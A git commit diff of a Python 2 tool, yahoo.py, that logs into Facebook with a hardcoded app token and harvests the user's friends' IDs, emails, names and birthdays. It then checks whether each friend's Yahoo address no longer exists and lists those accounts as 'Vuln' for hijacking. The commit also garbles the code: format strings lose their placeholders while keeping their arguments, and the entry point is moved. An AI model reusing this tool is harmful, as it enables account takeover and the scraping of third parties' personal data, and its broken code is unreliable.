2377334082dcf27bf2ee801e39c2a744d274a19a
Muhamad Ramdani <53518615+QueenSyifa@users.noreply.github.com>
2019-09-24 13:36:53 +0700

    Update yahoo.py

--- yahoo.py
+++ yahoo.py
@@ -22,32 +22,32 @@ url="https://graph.facebook.com/{}"
 target=[]
 
 def cloning():
-	data=s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("%s[•] %semail: "%(H,P)),getpass("%s[•] %spasss: "%(H,P)))).json()
+	data=s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("[•] email: "%(H,P)),getpass("[•] passs: "%(H,P)))).json()
 	try:
 		a=data["access_token"]
 	except KeyError:
-		exit("%s[!]%s failed when generate access token !!"%(M,P))
+		exit("[!] failed when generate access token !!"%(M,P))
 	print "----------------------------------------"
-	print "%s[*] %sfetching all user id "%(H,P)
+	print "[*] fetching all user id "%(H,P)
 	sleep(1)
 	try:
-		for x in s.get(url.format("me/friends?access_token=%s"%(a))).json()["data"]:
+		for x in s.get(url.format("me/friends?access_token="%(a))).json()["data"]:
 			target.append(x["id"])
-			print "\r%s[*] %s%s retrieved  "%(H,P,x["id"]),
+			print "\r[*]  retrieved  "%(H,P,x["id"]),
 			sys.stdout.flush()
 			sleep(0.003)
 	except KeyError:
-		print "\n%s[!] %sfailed to retrive all user id"%(M,P)
-		exit("%s[!] %sstopped"%(M,P))
-	print "\n%s[*] %sall user id successfuly retrieved"%(H,P)
-	print "%s[*] %sgetting email friends"%(H,P)
-	print "%s[*] %sstart"%(H,P)
+		print "\n[!] failed to retrive all user id"%(M,P)
+		exit("[!] stopped"%(M,P))
+	print "\n[*] all user id successfuly retrieved"%(H,P)
+	print "[*] getting email friends"%(H,P)
+	print "[*] start"%(H,P)
 	print "----------------------------------------"
 	o=open("mail_DIE.txt","w")
 	for meki in target:
 		try:
-			b=s.get(url.format(meki+"?access_token=%s"%(a))).json()
-			c=s.get(url.format(meki+"/subscribers?access_token=%s"%(a))).json()
+			b=s.get(url.format(meki+"?access_token="%(a))).json()
+			c=s.get(url.format(meki+"/subscribers?access_token="%(a))).json()
 			p=re.compile(r'@.*').search(b["email"]).group()
 			if "yahoo.com" in p:
 				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
@@ -59,33 +59,22 @@ def cloning():
 					cek=re.compile(r'"messages.ERROR_INVALID_USERNAME">.*').search(i).group()
 				except:continue
 				if '"messages.ERROR_INVALID_USERNAME">' in cek:
-					o.write("%s\n"%(b["email"]))
-					print "%s[•]%s UID       : %s%s"%(H,P,H,b["id"])
-					print "%s[•]%s Name      : %s%s"%(H,P,H,b["name"])
-					print "%s[•]%s Email     : %s%s"%(H,P,H,b["email"])
+					o.write("\n"%(b["email"]))
+					print "[•] UID       : "%(H,P,H,b["id"])
+					print "[•] Name      : "%(H,P,H,b["name"])
+					print "[•] Email     : "%(H,P,H,b["email"])
 					try:
-						print "%s[•]%s Birthday  : %s%s"%(H,P,H,b["birthday"])
-					except KeyError:print "%s[•]%s Birthday  : %snot found"%(M,P,M)
-					print "%s[•]%s Followers : %s%s"%(H,P,H,str(c["summary"]["total_count"]))
-					print "%s[•]%s Status    : %sVuln\n"%(H,P,H)
+						print "[•] Birthday  : "%(H,P,H,b["birthday"])
+					except KeyError:print "[•] Birthday  : not found"%(M,P,M)
+					print "[•] Followers : "%(H,P,H,str(c["summary"]["total_count"]))
+					print "[•] Status    : Vuln\n"%(H,P,H)
 		except KeyError:pass
 		except requests.exceptions.ConnectionError:
-			print "%s[!]%s no connection"%(M,P)
-			exit("%s[!]%s stopped"%(M,P))
+			print "[!] no connection"%(M,P)
+			exit("[!] stopped"%(M,P))
 	o.close()
-	print "\n%s[+]%s done.."%(H,P)
-	exit("%s[#] %sfile saved in: %smail_DIE.txt"%(H,P,H))
+	print "\n[+] done.."%(H,P)
+	exit("[#] file saved in: mail_DIE.txt"%(H,P,H))
 
 if __name__=="__main__":
-	os.system("clear")
-	print """%s
- \ /                __                  
-  Y  _ |_  _  _    /  |_  _  _  |  _  __
-  | (_|| |(_)(_)   \__| |(/_(_  |<(/_ | 
-%s----------------------------------------%s
-%s  Coded  :                              %s%s
-%s  Github : https://github.com/          %s
-%s----------------------------------------
- """%(H,P,M,B,R,M,B,R,P)
- 
- 	cloning()
+cloning()
